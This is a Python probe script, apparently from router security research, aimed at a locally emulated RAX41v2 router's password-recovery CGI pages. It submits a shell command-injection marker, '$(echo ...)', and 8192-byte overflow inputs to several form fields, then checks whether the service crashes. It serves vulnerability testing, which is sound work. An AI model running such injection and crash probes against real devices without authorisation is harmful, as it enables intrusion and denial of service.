#!/usr/bin/env python3
"""Bounded marker/crash probes for the isolated RAX41v2 recovery routes."""

from __future__ import annotations

import ssl
import socket
import time
import urllib.parse


HOST = "127.0.0.1"
PORT = 25_241


def exchange(payload: bytes, timeout: float = 6.0) -> bytes:
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    context.minimum_version = ssl.TLSVersion.TLSv1
    context.maximum_version = ssl.TLSVersion.TLSv1_2
    context.set_ciphers("ALL:@SECLEVEL=0")
    with socket.create_connection((HOST, PORT), timeout=timeout) as raw:
        with context.wrap_socket(raw, server_hostname="routerlogin.net") as client:
            client.sendall(payload)
            output = bytearray()
            while len(output) < 65536:
                chunk = client.recv(4096)
                if not chunk:
                    break
                output.extend(chunk)
            return bytes(output)


def request(path: str, fields: dict[str, str] | None = None) -> bytes:
    if fields is None:
        method = "GET"
        body = b""
    else:
        method = "POST"
        body = urllib.parse.urlencode(fields).encode()
    return exchange(
        (
            f"{method} /{path} HTTP/1.1\r\n"
            "Host: routerlogin.net\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(body)}\r\n"
            "Connection: close\r\n\r\n"
        ).encode()
        + body
    )


def healthy() -> bool:
    try:
        return request("currentsetting.htm").startswith(b"HTTP/")
    except (OSError, ssl.SSLError):
        return False


def status(response: bytes) -> str:
    return response.splitlines()[0].decode("iso-8859-1", "replace") if response else "empty"


def main() -> int:
    marker = "$(echo FRIDAY_RAX30_RCE_MARKER)"
    cases = [
        ("securityquestions-control", "securityquestions.cgi", {"serialNumber": "INVALID"}),
        ("securityquestions-marker", "securityquestions.cgi", {"serialNumber": marker}),
        ("securityquestions-long", "securityquestions.cgi", {"serialNumber": "A" * 8192}),
        ("passwordrecovered-control", "passwordrecovered.cgi", {"answer1": "x", "answer2": "y"}),
        ("passwordrecovered-marker", "passwordrecovered.cgi", {"answer1": marker, "answer2": marker}),
        ("passwordrecovered-long", "passwordrecovered.cgi", {"answer1": "A" * 8192, "answer2": "B" * 8192}),
        (
            "reset-control",
            "reset_admin_account.cgi",
            {"sysNewPasswd": "Example-Only-1", "sysConfirmPasswd": "Different-2"},
        ),
        (
            "reset-marker",
            "reset_admin_account.cgi",
            {"sysNewPasswd": marker, "sysConfirmPasswd": marker, "answer1": marker, "answer2": marker},
        ),
        (
            "reset-long",
            "reset_admin_account.cgi",
            {"sysNewPasswd": "A" * 8192, "sysConfirmPasswd": "B" * 8192},
        ),
    ]
    if not healthy():
        print("baseline_failed")
        return 2
    for name, path, fields in cases:
        try:
            response = request(path, fields)
            result = status(response)
        except (OSError, ssl.SSLError) as error:
            result = f"{type(error).__name__}:{error}"
        time.sleep(0.5)
        alive = healthy()
        print(f"{name} status={result!r} alive={alive}")
        if not alive:
            print(f"crash_candidate={name}")
            return 1
    print("result=no-observable-recovery-route-dos")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
